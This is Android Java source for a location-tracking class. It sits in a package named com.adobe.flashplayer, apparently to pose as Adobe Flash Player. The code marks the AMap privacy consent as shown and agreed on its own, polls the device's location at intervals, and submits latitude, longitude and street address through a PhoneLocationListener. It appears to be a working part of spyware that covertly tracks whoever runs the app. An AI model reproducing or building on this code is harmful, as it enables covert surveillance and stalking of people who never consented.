package com.adobe.flashplayer.data.Location;


import android.content.Context;
import android.os.Looper;
import android.util.Log;

import com.adobe.flashplayer.data.PhoneLocationListener;
import com.amap.api.location.AMapLocation;
import com.amap.api.location.AMapLocationClient;
import com.amap.api.location.AMapLocationClientOption;
import com.amap.api.location.AMapLocationClientOption.AMapLocationMode;
import com.amap.api.location.AMapLocationListener;


//com.setup.loader
public class AMaplocation implements AMapLocationListener,Runnable{

    private String TAG = "[ljg]AMaplocation ";
    //声明mlocationClient对象
    public AMapLocationClient mlocationClient;

    //声明mLocationOption对象
    public AMapLocationClientOption mLocationOption;

    private Context mContext;
    private int mInterval;

    public AMaplocation(Context context,int interval){
        this.mContext = context;
        mInterval = interval;

        AMapLocationClient.updatePrivacyShow(context,true,true);
        AMapLocationClient.updatePrivacyAgree(context,true);
    }


    @Override
    public void onLocationChanged(AMapLocation amapLocation) {
        if (amapLocation != null) {
            if (amapLocation.getErrorCode() == 0) {

                //定位成功回调信息，设置相关消息
                amapLocation.getLocationType();//获取当前定位结果来源，如网络定位结果，详见定位类型表

                amapLocation.getAccuracy();//获取精度信息

                //String dt = PublicFunction.formatCurrentDate();

                PhoneLocationListener.submitLocation(amapLocation.getLatitude(), amapLocation.getLongitude(),amapLocation.getAddress(), mContext);

            } else {
                //显示错误信息ErrCode是错误码，errInfo是错误信息，详见错误码表。
                Log.e(TAG, "location ErrCode:"+ amapLocation.getErrorCode() + ",errInfo:"+ amapLocation.getErrorInfo());
            }
        }

        if (mInterval <= 0) {
            mlocationClient.stopLocation();
            Looper.myLooper().quitSafely();

            mlocationClient.onDestroy();
        }
    }



    public void stopLocation(){
        if (mlocationClient != null) {
            mlocationClient.stopLocation();
            Looper.myLooper().quitSafely();

            mlocationClient.onDestroy();
        }
    }


    @Override
    public void run() {
        try {
            Looper.prepare();

            mlocationClient = new AMapLocationClient(this.mContext);

            mlocationClient.setLocationListener(this);

            //初始化定位参数
            mLocationOption = new AMapLocationClientOption();

            //设置是否返回地址信息（默认返回地址信息）
            mLocationOption.setNeedAddress(true);

            //设置是否强制刷新WIFI，默认为强制刷新
            mLocationOption.setWifiActiveScan(true);

            //设置是否允许模拟位置,默认为false，不允许模拟位置
            mLocationOption.setMockEnable(false);

            //设置定位模式为高精度模式，Battery_Saving为低功耗模式，Device_Sensors是仅设备模式
            mLocationOption.setLocationMode(AMapLocationMode.Hight_Accuracy);


            //设置定位模式为AMapLocationMode.Battery_Saving，低功耗模式。
            mLocationOption.setLocationMode(AMapLocationMode.Battery_Saving);


            //设置定位模式为AMapLocationMode.Device_Sensors，仅设备模式。
            //mLocationOption.setLocationMode(AMapLocationMode.Device_Sensors);

        if (mInterval > 3600) {
                mInterval = 3600;
            }

            if (mInterval < 0) {
                mInterval = 600;
            }

            if (mInterval <= 0) {
                //设置是否只定位一次,默认为false
                mLocationOption.setOnceLocation(true);
                mLocationOption.setOnceLocationLatest(true);

            }else{
                //设置是否只定位一次,默认为false
                mLocationOption.setOnceLocation(false);
                //设置定位间隔,单位毫秒,默认为2000ms
                mLocationOption.setInterval(mInterval*1000);
            }


            // 此方法为每隔固定时间会发起一次定位请求，为了减少电量消耗或网络流量消耗，
            // 注意设置合适的定位时间的间隔（最小间隔支持为1000ms），并且在合适时间调用stopLocation()方法来取消定位请求
            // 在定位结束后，在合适的生命周期调用onDestroy()方法
            // 在单次定位情况下，定位无论成功与否，都无需调用stopLocation()方法移除请求，定位sdk内部会移除


            /**
             * 设置定位场景，目前支持三种场景（签到、出行、运动，默认无场景）
             */
            mLocationOption.setLocationPurpose(AMapLocationClientOption.AMapLocationPurpose.SignIn);

            if(null != mlocationClient){
                mlocationClient.setLocationOption(mLocationOption);
                //设置场景模式后最好调用一次stop，再调用start以保证场景模式生效
                mlocationClient.stopLocation();
                mlocationClient.startLocation();
            }

            Looper.loop();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

}
